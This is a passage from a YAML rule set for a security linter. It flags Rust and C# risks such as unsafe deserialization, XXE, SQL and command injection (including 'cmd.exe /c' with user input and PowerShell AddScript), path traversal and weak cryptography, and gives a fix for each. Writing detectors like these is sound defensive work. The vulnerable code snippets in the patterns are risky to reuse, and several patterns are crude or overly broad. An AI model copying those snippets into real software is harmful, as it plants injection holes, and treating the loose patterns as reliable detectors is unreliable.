message: Shifting by type width or more is undefined behavior
tags:
- security
- integer-safety
rule:
  kind: binary_operation
  pattern: <<|>>
note: 'Shifting by type width or more is undefined behavior.


  Fix: Use checked_shl() or validate shift amount.


  Reference: Shift undefined behavior

  '
---
id: rust-cwe-770-unbounded-collection-growth
language: rust
severity: warning
message: 'CWE-770: Unbounded collection growth allows memory exhaustion (DoS)'
tags:
- security
- denial-of-service
- CWE-770
rule:
  kind: function_call
  pattern: push\(|insert\(
note: "Attacker can exhaust memory by filling unbounded collections.\n\nFix: Limit\
  \ collection size or use bounded channels:\nif vec.len() >= MAX_SIZE {\n    return\
  \ Err(Error::TooLarge);\n}\nvec.push(item);\n\nReference: CWE-770\n"
---
id: rust-sec-090-hashdos-collision
language: rust
severity: warning
message: HashMap with insecure hasher vulnerable to HashDoS collision attacks
tags:
- security
- denial-of-service
rule:
  kind: type_usage
  pattern: HashMap.*FnvBuildHasher|HashMap.*SeaHasher
note: 'Hash collision attacks cause O(n) operations for O(1) lookups.


  Fix: Use RandomState (default - SipHash) or verify DoS-resistance:

  let map: HashMap<String, Value> = HashMap::new(); // Safe by default


  Reference: HashDoS

  '
---
id: rust-cwe-674-recursive-parsing-limit
language: rust
severity: warning
message: 'CWE-674: Recursive parsing without depth limit causes stack overflow'
tags:
- security
- denial-of-service
- CWE-674
rule:
  kind: function_declaration
  pattern: fn\s+\w+.*\{.*\w+\(
note: "Deeply nested input causes stack overflow.\n\nFix: Track and limit nesting\
  \ depth:\nfn parse(input: &str, depth: usize) -> Result<Value> {\n    if depth >\
  \ MAX_DEPTH {\n        return Err(Error::TooDeep);\n    }\n    // ... recursive\
  \ calls pass depth + 1\n}\n\nReference: CWE-674\n"
---
id: rust-sec-092-unbounded-async-tasks
language: rust
severity: warning
message: Spawning unlimited async tasks exhausts memory
tags:
- security
- denial-of-service
- concurrency
rule:
  kind: function_call
  pattern: tokio::spawn
note: "Spawning unlimited tasks exhausts memory.\n\nFix: Use semaphore or task queue\
  \ to limit concurrency:\nlet semaphore = Arc::new(Semaphore::new(100));\nfor item\
  \ in items {\n    let permit = semaphore.clone().acquire_owned().await?;\n    tokio::spawn(async\
  \ move {\n        let _permit = permit;\n        process(item).await;\n    });\n\
  }\n\nReference: Resource exhaustion\n"
---
id: rust-sec-093-regex-compilation-dos
language: rust
severity: warning
message: Compiling regex on each request is CPU-intensive (DoS vector)
tags:
- security
- denial-of-service
rule:
  kind: function_call
  pattern: Regex::new.*user|Regex::new.*request
note: "Complex regex compilation is CPU-intensive.\n\nFix: Cache compiled regexes,\
  \ validate patterns:\nlazy_static::lazy_static! {\n    static ref RE: Regex = Regex::new(SAFE_PATTERN).unwrap();\n\
  }\n\nReference: ReDoS variants\n"
---
id: rust-cwe-502-unsafe-deserialization
language: rust
severity: warning
message: 'CWE-502: Deserializing untrusted binary data without validation'
tags:
- security
- serialization
- CWE-502
rule:
  kind: function_call
  pattern: deserialize::<\w+>\(untrusted
note: "Binary formats can encode malicious sizes or structures.\n\nFix: Use size limits\
  \ and validate after deserialization:\nlet config = bincode::DefaultOptions::new()\n\
  \    .with_limit(MAX_SIZE)\n    .deserialize::<MyStruct>(bytes)?;\n\nReference:\
  \ CWE-502\n"
---
id: rust-sec-095-yaml-billion-laughs
language: rust
severity: warning
message: YAML deserialization vulnerable to billion-laughs attacks
tags:
- security
- serialization
- denial-of-service
rule:
  kind: function_call
  pattern: serde_yaml::from_str
note: 'YAML has complex features (anchors, aliases) enabling billion-laughs attacks.


  Fix: Use size limits, prefer JSON for untrusted input.


  Reference: YAML security

  '
---
id: rust-sec-096-ron-deserialization
language: rust
severity: warning
message: RON deserialization supports arbitrary struct construction
tags:
- security
- serialization
rule:
  kind: function_call
  pattern: ron::de::from_str
note: 'RON supports arbitrary struct construction.


  Fix: Limit input size and validate structure.


  Reference: RON format - https://github.com/ron-rs/ron

  '
---
id: rust-sec-097-custom-serde-unsafe
language: rust
severity: warning
message: Custom Deserialize implementation with unsafe may introduce memory safety
  issues
tags:
- security
- serialization
- unsafe-code
rule:
  kind: impl_declaration
  pattern: impl.*Deserialize
note: 'Custom deserialize can introduce memory safety issues.


  Fix: Prefer derive macro, audit manual implementations carefully.


  Reference: serde safety

  '
---
id: rust-sec-098-polymorphic-deserialization
language: rust
severity: warning
message: Polymorphic deserialization may instantiate unexpected types
tags:
- security
- serialization
rule:
  kind: serde_attribute
  pattern: '#\[serde\(tag'
note: 'Attacker may instantiate unexpected types via type field.


  Fix: Whitelist allowed type values in deserializer.


  Reference: Deserialization attacks

  '
---
id: rust-sec-099-missing-cargo-audit
language: rust
severity: warning
message: Missing cargo-audit in CI allows vulnerable dependencies
tags:
- security
- supply-chain
- dependencies
rule:
  kind: pipeline_check
  pattern: cargo audit
note: 'Vulnerable dependencies go undetected without cargo audit.


  Fix: Add cargo audit to CI pipeline.


  Reference: cargo-audit - https://github.com/RustSec/rustsec

  '
---
id: rust-sec-100-outdated-dependencies
language: rust
severity: warning
message: Dependencies with known CVEs expose known attacks
tags:
- security
- supply-chain
- dependencies
rule:
  kind: dependency_check
  pattern: Cargo.toml
note: 'Using vulnerable versions exposes known attacks.


  Fix: Run cargo update, review RUSTSEC advisories.


  Reference: RustSec Advisory Database - https://rustsec.org/

  '
---
id: rust-sec-101-dependency-confusion
language: rust
severity: warning
message: Private crate names may conflict with public crates.io packages
tags:
- security
- supply-chain
- dependencies
rule:
  kind: dependency_declaration
  pattern: \[dependencies\]
note: 'Attackers may register similarly-named public crates.


  Fix: Use organization prefixes, private registries, or source replacement.


  Reference: Dependency confusion attacks

  '
---
id: rust-sec-102-build-script-arbitrary-commands
language: rust
severity: warning
message: Build scripts executing arbitrary commands may be compromised
tags:
- security
- supply-chain
- build
rule:
  kind: file_reference
  pattern: build\.rs
note: 'Build scripts run with full privileges during compilation.


  Fix: Audit build.rs, minimize external command usage.


  Reference: Supply chain attacks

  '
---
id: rust-sec-103-yanked-dependencies
language: rust
severity: warning
message: Yanked versions often have security issues
tags:
- security
- supply-chain
- dependencies
rule:
  kind: dependency_check
  pattern: yanked
note: 'Yanked versions often have security issues.


  Fix: Update to non-yanked version.


  Reference: cargo yank

  '
---
id: rust-cwe-532-sensitive-logging
language: rust
severity: warning
message: 'CWE-532: Logging sensitive data allows unauthorized access'
tags:
- security
- logging
- information-disclosure
- CWE-532
rule:
  kind: macro_call
  pattern: (?:info|debug|warn|error)!.*(?:secret|key|token|password|auth)
note: 'Sensitive data in logs can be accessed by unauthorized parties.


  Fix: Sanitize logged data, use redacting formatters.


  Reference: CWE-532

  '
---
id: rust-sec-105-debug-assert-security
language: rust
severity: error
message: Debug assertions are removed in release builds
tags:
- security
- assertions
rule:
  kind: macro_call
  pattern: debug_assert
note: 'Debug assertions are removed in release builds, leaving security checks absent.


  Fix: Use assert! or return error for security-critical checks.


  Reference: Missing security checks

  '
---
id: rust-cwe-755-panic-error-handling
language: rust
severity: warning
message: 'CWE-755: Panics in security-critical code cause denial of service'
tags:
- security
- error-handling
- denial-of-service
- CWE-755
rule:
  kind: function_call
  pattern: unwrap\(\)|expect\(
note: 'Panics can cause denial of service.


  Fix: Handle errors gracefully with ? or match:

  let value = risky_operation()?;


  Reference: CWE-755

  '
---
id: rust-sec-107-cfg-debug-security
language: rust
severity: error
message: Security code disabled in release builds with cfg(debug_assertions)
tags:
- security
- assertions
rule:
  kind: conditional_compilation
  pattern: '#\[cfg\(debug_assertions\)\]'
note: 'Security checks disabled in release builds.


  Fix: Security checks must run in all builds.


  Reference: Missing security controls

  '
---
id: rust-cwe-209-error-information-disclosure
language: rust
severity: warning
message: 'CWE-209: Returning detailed internal errors aids attackers'
tags:
- security
- information-disclosure
- error-handling
- CWE-209
rule:
  kind: function_call
  pattern: return.*Err.*format|throw.*error
note: 'Stack traces and internal errors aid attackers.


  Fix: Log detailed errors, return generic messages to users.


  Reference: CWE-209

  '
---
id: rust-cwe-367-race-condition-security
language: rust
severity: warning
message: 'CWE-367: Check-then-act pattern in concurrent code enables bypass'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: control_flow
  pattern: if.*is_valid.*then|if.*check.*then
note: 'TOCTOU allows bypassing security checks.


  Fix: Use atomic operations or locks.


  Reference: CWE-367

  '
---
id: rust-cwe-330-insufficient-entropy
language: rust
severity: error
message: 'CWE-330: Using SystemTime or PID for tokens produces predictable values'
tags:
- security
- randomness
- cryptography
- CWE-330
rule:
  kind: function_call
  pattern: SystemTime|std::process::id
note: 'Predictable values can be guessed.


  Fix: Use cryptographically secure random number generator:

  use rand::rngs::OsRng;

  let token: [u8; 32] = OsRng.gen();


  Reference: CWE-330

  '
---
id: csharp-cwe-502-binaryformatter-usage
language: csharp
severity: error
message: 'CWE-502: BinaryFormatter usage is inherently insecure and deprecated'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new BinaryFormatter()|BinaryFormatter.Deserialize
note: 'BinaryFormatter deserializes type information from the stream, allowing arbitrary
  code execution through crafted payloads.

  Use System.Text.Json, MessagePack, or Protocol Buffers instead.

  References: CA2300, CA2301, CA2302

  '
---
id: csharp-cwe-502-netdatacontractserializer-usage
language: csharp
severity: error
message: 'CWE-502: NetDataContractSerializer usage allows type confusion attacks'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new NetDataContractSerializer()|NetDataContractSerializer.Deserialize
note: 'Like BinaryFormatter, includes type information in serialized data, enabling
  type confusion attacks.

  Use DataContractSerializer with known types only, or migrate to System.Text.Json.

  References: CA2310, CA2311, CA2312

  '
---
id: csharp-cwe-502-objectstateformatter-usage
language: csharp
severity: error
message: 'CWE-502: ObjectStateFormatter is vulnerable to deserialization attacks'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new ObjectStateFormatter()|ObjectStateFormatter.Deserialize
note: 'Used in ASP.NET ViewState, vulnerable to deserialization attacks.

  Enable ViewState MAC validation, use encryption, or migrate away from ViewState.

  References: CA2315

  '
---
id: csharp-cwe-502-soapformatter-usage
language: csharp
severity: error
message: 'CWE-502: SoapFormatter has same vulnerabilities as BinaryFormatter'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new SoapFormatter()|SoapFormatter.Deserialize
note: 'SOAP-based serialization with same vulnerabilities as BinaryFormatter.

  Use modern serialization like System.Text.Json.

  References: CA2321, CA2322

  '
---
id: csharp-cwe-502-losformatter-usage
language: csharp
severity: error
message: 'CWE-502: LosFormatter is vulnerable to RCE via deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new LosFormatter()|LosFormatter.Deserialize
note: 'Limited Object Serialization formatter, vulnerable to RCE.

  Migrate to secure serialization methods.

  References: CA2305

  '
---
id: csharp-cwe-502-javascriptserializer-typenamehandling
language: csharp
severity: warning
message: 'CWE-502: JavaScriptSerializer with SimpleTypeResolver enables arbitrary
  type instantiation'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: method_call
  pattern: JavaScriptSerializer|SimpleTypeResolver
note: 'When used with type resolvers, enables arbitrary type instantiation.

  Use System.Text.Json without type handling, or use JsonSerializerSettings carefully.

  References: CA2321

  '
---
id: csharp-cwe-502-newtonsoft-typenamehandling
language: csharp
severity: error
message: 'CWE-502: Newtonsoft.Json TypeNameHandling allows arbitrary type instantiation'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: property_assignment
  pattern: TypeNameHandling.All|TypeNameHandling.Auto|TypeNameHandling.Objects|TypeNameHandling.Arrays
note: 'Embedding type names in JSON allows attackers to instantiate arbitrary types.

  Use TypeNameHandling.None (default) or implement strict ISerializationBinder.

  References: CA2326, CA2327, CA2328, CA2329, CA2330

  '
---
id: csharp-cwe-502-datacontractserializer-untrusted-types
language: csharp
severity: warning
message: 'CWE-502: DataContractSerializer with untrusted type parameter'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new DataContractSerializer(Type.GetType(userInput))
note: 'If type parameter comes from untrusted input, enables gadget chain attacks.

  Use known types list, never pass user-controlled type information.

  References: CA2353, CA2354, CA2355, CA2356

  '
---
id: csharp-cwe-502-xmlserializer-dynamic-type
language: csharp
severity: warning
message: 'CWE-502: XmlSerializer with dynamic type resolution from user input'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08
rule:
  kind: object_creation
  pattern: new XmlSerializer(Type.GetType(userInput))
note: 'Dynamic type resolution from user input can instantiate dangerous types.

  Use static type references: new XmlSerializer(typeof(MyClass)).

  References: CA2352

  '
---
id: csharp-cwe-470-activator-createinstance-user-type
language: csharp
severity: error
message: 'CWE-470: Activator.CreateInstance with user-controlled type enables RCE'
tags:
- security
- reflection
- CWE-470
- OWASP-A06
rule:
  kind: method_call
  pattern: Activator.CreateInstance(Type.GetType(userInput))
note: 'Arbitrary type instantiation from user input enables RCE.

  Use factory pattern with whitelist of allowed types.

  References: CWE-470

  '
---
id: csharp-cwe-611-xmldocument-unsafe-parsing
language: csharp
severity: warning
message: 'CWE-611: XmlDocument default parsing allows XXE attacks'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: object_creation
  pattern: new XmlDocument()
note: 'Default XmlDocument allows DTD processing and external entity resolution.

  Set XmlResolver = null immediately after construction.

  References: CA3075, CWE-611

  '
---
id: csharp-cwe-611-xmltextreader-unsafe-default
language: csharp
severity: warning
message: 'CWE-611: XmlTextReader enables DTD processing by default'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: object_creation
  pattern: new XmlTextReader()
note: 'Pre-.NET 4.5.2 defaults allow DTD processing.

  Set DtdProcessing = DtdProcessing.Prohibit and XmlResolver = null.

  References: CA3075

  '
---
id: csharp-cwe-611-xmlreader-unsafe-settings
language: csharp
severity: warning
message: 'CWE-611: XmlReaderSettings explicitly enables DTD processing'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: property_assignment
  pattern: DtdProcessing = DtdProcessing.Parse
note: 'Explicitly enabling DTD processing allows XXE attacks.

  Use DtdProcessing.Prohibit or DtdProcessing.Ignore.

  References: CA3076

  '
---
id: csharp-cwe-611-xpathdocument-external-entities
language: csharp
severity: info
message: 'CWE-611: XPathDocument can process external entities'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: object_creation
  pattern: new XPathDocument(untrustedStream)
note: 'XPathDocument can process external entities if XML contains DTD.

  Create from XmlReader with secure settings.

  References: CWE-611

  '
---
id: csharp-cwe-611-xslcompiledtransform-script-enabled
language: csharp
severity: warning
message: 'CWE-611: XSLT script execution enables code execution'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: property_access
  pattern: XsltSettings.EnableScript|XsltSettings.TrustedXslt
note: 'Enabling XSLT scripting allows code execution in transformations.

  Use XsltSettings.Default or custom settings without scripting.

  References: CA3076

  '
---
id: csharp-cwe-611-xmlschema-external-resolution
language: csharp
severity: info
message: 'CWE-611: XmlSchema.Read can fetch external resources'
tags:
- security
- xxe
- CWE-611
- OWASP-A05
rule:
  kind: method_call
  pattern: XmlSchema.Read
note: 'Schema validation can fetch external resources.

  Provide null XmlResolver or custom resolver that blocks external access.

  References: CWE-611

  '
---
id: csharp-cwe-89-sql-string-concatenation
language: csharp
severity: error
message: 'CWE-89: SQL injection via string concatenation'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: binary_expression
  pattern: '"SELECT * FROM " + tableName|$"SELECT * FROM {table}"'
note: 'Direct string concatenation in SQL queries allows injection.

  Use parameterized queries, stored procedures, or ORMs.

  References: CA2100, CWE-89

  '
---
id: csharp-cwe-89-sqlcommand-concatenated-query
language: csharp
severity: error
message: 'CWE-89: SqlCommand with concatenated query enables SQL injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: object_creation
  pattern: new SqlCommand("SELECT * FROM users WHERE id = " + id)
note: 'User input directly in SQL command enables injection.

  Use SqlParameter objects: cmd.Parameters.AddWithValue("@id", id).

  References: CA2100

  '
---
id: csharp-cwe-89-string-format-sql
language: csharp
severity: error
message: 'CWE-89: String.Format in SQL enables injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: String.Format("SELECT * FROM {0}", tableName)
note: 'Format strings with user input are as dangerous as concatenation.

  Use parameterized queries exclusively for user input.

  References: CA2100

  '
---
id: csharp-cwe-89-entity-framework-raw-sql
language: csharp
severity: warning
message: 'CWE-89: Entity Framework raw SQL can be vulnerable'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: ExecuteSqlRaw|FromSqlRaw
note: 'Raw SQL methods can be vulnerable if not using parameters.

  Use ExecuteSqlInterpolated or FromSqlInterpolated which auto-parameterize.

  References: EF Core Security

  '
---
id: csharp-cwe-89-dapper-raw-sql
language: csharp
severity: error
message: 'CWE-89: Dapper with concatenated SQL enables injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: method_call
  pattern: 'connection.Query(\"SELECT * FROM users WHERE name = ''\" + name + \"''\")

    '
note: 'Dapper accepts raw SQL; concatenation makes it vulnerable.

  Use Dapper''s parameter syntax: Query("SELECT * FROM users WHERE name = @name",
  new { name }).

  References: CWE-89

  '
---
id: csharp-cwe-917-dynamic-linq-injection
language: csharp
severity: warning
message: 'CWE-917: Dynamic LINQ can execute arbitrary expressions'
tags:
- security
- sql-injection
- CWE-917
- OWASP-A03
rule:
  kind: method_call
  pattern: DynamicExpression.ParseLambda
note: 'Dynamic LINQ can execute arbitrary expressions.

  Validate input against whitelist, use static LINQ expressions.

  References: CWE-917

  '
---
id: csharp-cwe-89-oledb-concatenation
language: csharp
severity: error
message: 'CWE-89: OleDb/Odbc concatenation enables SQL injection'
tags:
- security
- sql-injection
- CWE-89
- OWASP-A03
rule:
  kind: object_creation
  pattern: new OleDbCommand("SELECT * FROM " + table)|new OdbcCommand
note: 'Same SQL injection risk as SqlCommand.

  Use parameterized queries with ? placeholders for OleDb/Odbc.

  References: CA2100

  '
---
id: csharp-cwe-78-process-start-user-input
language: csharp
severity: error
message: 'CWE-78: Process.Start with user input enables command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: object_creation
  pattern: Process.Start(userInput)|ProcessStartInfo.FileName = userInput
note: 'Executing user-controlled paths allows arbitrary command execution.

  Validate against whitelist, never use user input directly.

  References: CA3006, CWE-78

  '
---
id: csharp-cwe-78-shell-command-arguments
language: csharp
severity: error
message: 'CWE-78: Unvalidated shell command arguments enable injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: property_assignment
  pattern: ProcessStartInfo.Arguments = userInput
note: 'Unvalidated arguments can break out of intended command.

  Use argument arrays where possible, escape/validate all arguments.

  References: CWE-78

  '
---
id: csharp-cwe-78-cmd-exe-user-input
language: csharp
severity: error
message: 'CWE-78: cmd.exe with user input enables command chaining'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: method_call
  pattern: Process.Start("cmd.exe", "/c " + userInput)
note: 'Command shell interprets special characters for command chaining.

  Avoid shell execution, use direct process execution with validated paths.

  References: CWE-78

  '
---
id: csharp-cwe-78-powershell-execution
language: csharp
severity: error
message: 'CWE-78: PowerShell script execution from user input enables RCE'
tags:
- security
- command-injection
- CWE-78
- OWASP-A03
rule:
  kind: method_call
  pattern: PowerShell.Create().AddScript(userInput)
note: 'PowerShell script execution from user input enables RCE.

  Use AddCommand with validated command names, never AddScript with user data.

  References: CWE-78

  '
---
id: csharp-cwe-94-scriptengine-execution
language: csharp
severity: warning
message: 'CWE-94: Script engines can escape sandboxes or access dangerous APIs'
tags:
- security
- code-injection
- CWE-94
- OWASP-A03
rule:
  kind: method_call
  pattern: Microsoft.ClearScript|Jint|IronPython
note: 'Script engines can escape sandboxes or access dangerous APIs.

  Run in AppDomain sandbox, restrict APIs, timeout execution.

  References: CWE-94

  '
---
id: csharp-cwe-22-path-combine-user-input
language: csharp
severity: warning
message: 'CWE-22: Path.Combine with user input allows path traversal'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: method_call
  pattern: Path.Combine(baseDir, userInput)
note: 'Path.Combine doesn''t prevent absolute paths in second argument.

  Check that final path starts with base directory after GetFullPath().

  References: CA3003, CWE-22

  '
---
id: csharp-cwe-22-file-open-user-path
language: csharp
severity: warning
message: 'CWE-22: File.Open with user path allows access to sensitive files'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: method_call
  pattern: File.Open(userInput, ...)|File.ReadAllText(userInput)
note: 'User-controlled paths can access sensitive files.

  Validate path is within allowed directory using canonical paths.

  References: CWE-22

  '
---
id: csharp-cwe-22-directory-traversal-patterns
language: csharp
severity: warning
message: 'CWE-22: Parent directory references bypass directory restrictions'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: literal
  pattern: \.\.\|../|\..\
note: 'Parent directory references bypass directory restrictions.

  Reject paths with .. or use GetFullPath() validation.

  References: CWE-22

  '
---
id: csharp-cwe-22-zipfile-extraction-traversal
language: csharp
severity: warning
message: 'CWE-22: Zip slip vulnerability allows extraction outside directory'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: method_call
  pattern: ZipFile.ExtractToDirectory|ZipArchiveEntry.ExtractToFile
note: 'Zip slip vulnerability - entries can have ../ in names.

  Validate each entry''s full path stays within extraction directory.

  References: CWE-22, Zip Slip

  '
---
id: csharp-cwe-22-filestream-user-path
language: csharp
severity: warning
message: 'CWE-22: FileStream with user path enables traversal'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01
rule:
  kind: object_creation
  pattern: new FileStream(userPath, FileMode.Open)
note: 'Direct file access from user input.

  Canonicalize path and verify it''s within allowed directory.

  References: CWE-22

  '
---
id: csharp-cwe-327-des-encryption
language: csharp
severity: warning
message: 'CWE-327: DES encryption has 56-bit key, easily brute-forced'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: new DESCryptoServiceProvider()|DES.Create()
note: 'DES has 56-bit key, easily brute-forced.

  Use AES with 256-bit keys.

  References: CA5350

  '
---
id: csharp-cwe-327-tripledes-encryption
language: csharp
severity: info
message: 'CWE-327: 3DES is deprecated with known weaknesses'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: new TripleDESCryptoServiceProvider()|TripleDES.Create()
note: '3DES is deprecated, has known weaknesses.

  Use AES-256.

  References: CA5350

  '
---
id: csharp-cwe-327-rc2-encryption
language: csharp
severity: warning
message: 'CWE-327: RC2 encryption is obsolete with vulnerabilities'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: new RC2CryptoServiceProvider()|RC2.Create()
note: 'RC2 is obsolete with known vulnerabilities.

  Use AES.

  References: CA5351

  '
---
id: csharp-cwe-327-md5-for-security
language: csharp
severity: warning
message: 'CWE-327: MD5 has collision attacks, unsuitable for security'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: MD5.Create()|new MD5CryptoServiceProvider()
note: 'MD5 has known collision attacks, unsuitable for security.

  Use SHA-256 or SHA-384 for hashing, PBKDF2/Argon2 for passwords.

  References: CA5351

  '
---
id: csharp-cwe-327-sha1-for-security
language: csharp
severity: info
message: 'CWE-327: SHA1 has collision attacks'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: SHA1.Create()|new SHA1CryptoServiceProvider()
note: 'SHA1 has known collision attacks.

  Use SHA-256 or higher.

  References: CA5350

  '
---
id: csharp-cwe-327-ecb-mode-encryption
language: csharp
severity: warning
message: 'CWE-327: ECB mode reveals patterns in encrypted data'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: property_assignment
  pattern: CipherMode.ECB|mode = CipherMode.ECB
note: 'ECB mode reveals patterns in encrypted data.

  Use CBC, GCM, or CTR modes.

  References: CA5358

  '
---
id: csharp-cwe-321-static-iv-key
language: csharp
severity: error
message: 'CWE-321: Static cryptographic keys can be extracted from binaries'
tags:
- security
- weak-crypto
- CWE-321
- OWASP-A02
rule:
  kind: literal
  pattern: byte\[\]\s+(iv|key)\s*=\s*\{.*\}
note: 'Static cryptographic keys can be extracted from binaries.

  Use secure key derivation, store keys in secure storage.

  References: CA5390

  '
---
id: csharp-cwe-326-weak-key-derivation
language: csharp
severity: info
message: 'CWE-326: Low iteration counts enable faster brute-force attacks'
tags:
- security
- weak-crypto
- CWE-326
- OWASP-A02
rule:
  kind: object_creation
  pattern: new Rfc2898DeriveBytes
note: 'Low iteration counts enable faster brute-force attacks.

  Use at least 100,000 iterations for PBKDF2.

  References: CA5387

  '
---
id: csharp-cwe-326-insufficient-key-size
language: csharp
severity: info
message: 'CWE-326: 128-bit keys provide less security margin'
tags:
- security
- weak-crypto
- CWE-326
- OWASP-A02
rule:
  kind: property_assignment
  pattern: KeySize = 128
note: '128-bit keys provide less security margin.

  Use 256-bit keys for sensitive data.

  References: CA5358

  '
---
id: csharp-cwe-327-dsa-weak-key-size
language: csharp
severity: warning
message: 'CWE-327: 1024-bit DSA keys are deprecated'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: DSA.Create(1024)|new DSACryptoServiceProvider(1024)
note: '1024-bit DSA keys are deprecated.

  Use 2048-bit or higher keys, or switch to ECDSA.

  References: CA5384

  '
---
id: csharp-cwe-327-rsa-weak-key-size
language: csharp
severity: warning
message: 'CWE-327: 1024-bit RSA is no longer considered secure'
tags:
- security
- weak-crypto
- CWE-327
- OWASP-A02
rule:
  kind: object_creation
  pattern: RSA.Create(1024)|new RSACryptoServiceProvider(1024)
note: '1024-bit RSA is no longer considered secure.

  Use 2048-bit minimum, 4096-bit recommended.

  References: CA5385

  '
---
id: csharp-cwe-330-random-for-cryptography
language: csharp
severity: error
message: 'CWE-330: System.Random is predictable, not cryptographically secure'
tags:
- security
- weak-crypto
- CWE-330
- OWASP-A02
rule:
  kind: object_creation
  pattern: new Random()
note: 'System.Random is predictable, not cryptographically secure for keys, IVs, nonces.

  Use RandomNumberGenerator.GetBytes().

  References: CA5394

  '
---
id: csharp-cwe-330-guid-as-secret
language: csharp
severity: warning
message: 'CWE-330: GUIDs are not cryptographically random'
tags:
- security
- weak-crypto
- CWE-330
- OWASP-A02
rule:
  kind: method_call
  pattern: Guid.NewGuid()
note: 'GUIDs are not cryptographically random for tokens, secrets, passwords.

  Use RandomNumberGenerator for security-sensitive random values.

  References: CWE-330

  '
---
id: csharp-cwe-798-hardcoded-credentials
language: csharp
severity: error
message: 'CWE-798: Credentials in source code can be extracted'
tags:
- security
- secrets
- CWE-798
- OWASP-A07
rule:
  kind: literal
  pattern: 'password\\s*=\\s*[\"'']|connectionString.*password

    '
note: 'Credentials in source code can be extracted.

  Use environment variables, Azure Key Vault, or secure configuration.

  References: CA1065, CWE-798

  '
---
id: csharp-cwe-521-empty-password-check
language: csharp
severity: warning
message: 'CWE-521: Empty password check may indicate allowing empty passwords'
tags:
- security
- authentication
- CWE-521
- OWASP-A07
rule:
  kind: binary_expression
  pattern: password == ""|string.IsNullOrEmpty(password)
note: 'May indicate allowing empty passwords.

  Require minimum password length and complexity.

  References: CWE-521

  '
---
id: csharp-cwe-1004-cookie-without-httponly
language: csharp
severity: warning
message: 'CWE-1004: Cookies accessible to JavaScript can be stolen via XSS'
tags:
- security
- authentication
- CWE-1004
- OWASP-A07
rule:
  kind: property_assignment
  pattern: HttpOnly = false
note: 'Cookies accessible to JavaScript can be stolen via XSS.

  Always set HttpOnly = true for session cookies.

  References: CWE-1004

  '
---
id: csharp-cwe-614-cookie-without-secure-flag
language: csharp
severity: warning
message: 'CWE-614: Cookies sent over HTTP can be intercepted'
tags:
- security
- authentication
- CWE-614
- OWASP-A07
rule:
  kind: property_assignment
  pattern: Secure = false
note: 'Cookies sent over HTTP can be intercepted.

  Set Secure = true for all sensitive cookies.

  References: CWE-614

  '
---
id: csharp-cwe-352-missing-anti-forgery-token
language: csharp
severity: warning
message: 'CWE-352: Missing CSRF protection on state-changing endpoints'
tags:
- security
- authentication
- CWE-352
- OWASP-A01
rule:
  kind: method_definition
  pattern: \[HttpPost\].*(?!\[ValidateAntiForgeryToken\])
note: 'Missing CSRF protection on state-changing endpoints.

  Add [ValidateAntiForgeryToken] or use [AutoValidateAntiforgeryToken] globally.

  References: CWE-352

  '
---
id: csharp-cwe-916-weak-password-hashing
language: csharp
severity: error
message: 'CWE-916: Fast hashes enable rapid brute-forcing of passwords'
tags:
- security
- authentication
- CWE-916
- OWASP-A02
rule:
  kind: method_call
  pattern: MD5.Create().ComputeHash(password)|SHA256.ComputeHash(password)
note: 'Fast hashes enable rapid brute-forcing of passwords.

  Use ASP.NET Identity''s PasswordHasher, or Argon2/bcrypt directly.

  References: CWE-916

  '
---
id: csharp-cwe-326-jwt-weak-signature
language: csharp
severity: warning
message: 'CWE-326: Short HMAC keys can be brute-forced'
tags:
- security
- authentication
- CWE-326
- OWASP-A02
rule:
  kind: property_assignment
  pattern: SecurityAlgorithms.HmacSha256
note: 'Short HMAC keys can be brute-forced.

  Use keys at least as long as the hash output (256 bits for HS256).

  References: CWE-326

  '
---
id: csharp-cwe-347-jwt-none-algorithm
language: csharp
severity: error
message: 'CWE-347: None algorithm accepts unsigned tokens'
tags:
- security
- authentication
- CWE-347
- OWASP-A07
rule:
  kind: property_assignment
  pattern: SigningCredentials = null|alg.*none
note: 'None algorithm accepts unsigned tokens.

